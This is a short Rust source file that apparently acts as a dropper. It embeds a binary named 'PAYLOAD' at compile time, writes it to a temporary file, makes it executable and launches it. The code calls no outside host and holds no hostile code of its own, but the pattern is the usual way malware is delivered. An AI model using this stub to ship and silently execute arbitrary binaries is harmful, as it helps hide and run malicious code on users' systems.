use std::io::Write;
use std::process::Command;
use tempfile::NamedTempFile;

#[cfg(target_os = "windows")]
use tempfile::Builder;

const PAYLOAD: &[u8] = include_bytes!(env!("payload"));

pub fn run() -> Result<(), std::io::Error> {
    #[cfg(not(target_os = "windows"))]
    let binding = NamedTempFile::new()?;
    #[cfg(target_os = "windows")]
    let binding = Builder::new().suffix(".exe").tempfile()?;
    let mut temp = binding.as_file();
    temp.write_all(PAYLOAD)?;
    let path = binding.into_temp_path();
    #[cfg(not(target_os = "windows"))]
    Command::new("chmod")
        .arg("+x")
        .arg(path.as_os_str())
        .output()
        .expect("failed to execute process");
    Command::new(path.as_os_str())
        .spawn()
        .expect("failed to execute process");
    Ok(())
}
